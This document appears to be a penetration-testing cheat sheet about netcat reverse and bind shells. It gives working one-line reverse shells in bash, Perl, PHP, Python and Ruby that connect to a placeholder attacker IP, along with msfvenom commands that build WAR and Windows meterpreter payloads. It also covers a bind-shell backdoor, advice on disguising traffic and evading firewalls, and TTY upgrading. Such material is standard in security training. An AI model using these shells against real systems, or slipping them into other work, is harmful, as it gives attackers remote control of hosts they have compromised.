# Netcat Shells

Netcat is important to establish reverse and bind shells. 
Reverse Shells are initiated on the target host to connect back to the attack host. 
They can be initiated with many different languages, such as `PHP`, `ASP`, `Python`, `Ruby`, `Perl`, and `PowerShell`. 
If you can get code execution on a host, or can inject code, upload / file inclusion, this can be turned into a command line shell. For receiving a shell, we can use `Netcat`, `Metasploit` and `Empire`. 

A bind shell is similar, but instead of waiting to connect back to a host, it listens and waits for an incoming connection.
This can also be referred to as a backdoor, as the shell waits for a connection to be received.

### Reverse Shells

Reverse shells are great because they can skip by firewalls and NAT as it's an outbound connection.
An inbound connection might be deterred by several layers of security.
It is always important to disguise traffic as legitimate however, and `4444` could arouse suspicion. 

A listener establishes a waiting connection:
```bash
nc -lvp 4444
```

The target establishes a reverse shell:
```bash
nc 192.168.1.1 4444 -e /bin/sh
```

### NC Reverse Shell Example

This demonstration assumes that RCE is already available on the target.
We will

1. Setup a NC listener
2. Create the Reverse Shell from the target
3. Issues commands through the reverse shell

```bash
#Setup a listener
nc -lvp 4444

# Establish the reverse shell on the target
	# Linux
nc 192.168.100.113 4444 -e /bin/sh
	# Windows
nc.exe 192.168.100.113 4444 -e cmd.exe
```

### Reverse shell without Netcat

We either need to find a way to send the Netcat binary to the target, or use other means.
We can use a bash reverse shell:

```bash
bash -i >& /dev/tcp/[Attack box IP]/[Port] 0>&1
# -i invokes a new instance of bash
# >& redirects stdout and stderr to the TCP client created at the device file
# 0>&1 takes stdout and connects it to stdin
```

### Perl Reverse shell

```perl
perl -e 'use Socket;$i="[Attack box IP]";$p=[Port];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP Reverse Shell

If PHP on the host, such as a webserver, you can use a single line to retrieve a shell:

```php
php -r '$sock=fsockopen("[Attack box IP]",[Port]);exec("/bin/sh -i <&3 >&3 2>&3");'
```

If you have the ability to inject PHP code (such as a theme file or CMS in a plugin), you can inject:
```php
$sock=fsockopen("[Attack box IP]",[Port]);exec("/bin/sh -i <&3 >&3 2>&3");
```

A more advanced reverse shell script [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

### Python reverse shell 

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[Attack box IP]",[Port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Ruby Reverse Shell

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[Attacker IP]","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# For windows targets:
ruby -rsocket -e 'c=TCPSocket.new("[Attacker IP]","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### WAR Reverse Shell

A WAR (Web Application Archive or Web Application Resource) can be created as a reverse shell using msfvenom. Typically WAR files are used for Tomcat server as web applications.

```shell
# Create a jsp reverse shell as a WAR file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[LHOST IP] LPORT=[PORT] -f war > /root/Desktop/shell.war

# Upload and deploy the WAR to the target Apache Tomcat server
# Once deployed, we receive a shell
```

### Windows binary reverse shell

```shell
# If the target is Windows
msfvenom -a x86 –platform Windows -p windows/meterpreter/reverse_tcp LHOST=[IP attackbox] LPORT=4444 -f exe -o /tmp/exploit.exe

# Using Metasploit to catch reverse shell
msfconsole
# Setting up a multi-handler exploit
use exploit/multi/handler
# Set the payload
set payload windows/meterpreter/reverse_tcp
set lhost ppp0
set lport 4444
run
```

## Bind Shell

A bind shell is when the target is listening, waiting to receive a connection from the attacker.  The biggest issues here are having available routes - NAT can obfuscate the routing behind the edge. Additionally, it can only be bound to an open / unused port. Blocking from firewalls can occur on unknown / uncommon ports - you'd be able to setup the listener, but not be able to connect.

```bash
# Target
nc -lvp 4444 -e /bin/sh
# Attacker
nc 192.168.1.2 4444
```

### Upgrading from Netcat to interactive

Hitting `Ctrl-c` drops the entire shell instead of cancelling the current command.
You can't run interactive commands like `su` or `ssh` as these spawn new sessions. 
You can't use text editors like `Vim` or `Nano`
Tab completion, and command history would be missing. 

We can overcome these issues by switching / achieving an interactive TTY (terminal). 

### Python pty 

```python
# Creates a pseudo terminal - acts like a terminal but sends I/O to another program
python -c 'import pty; pty.spawn("/bin/bash")'
```



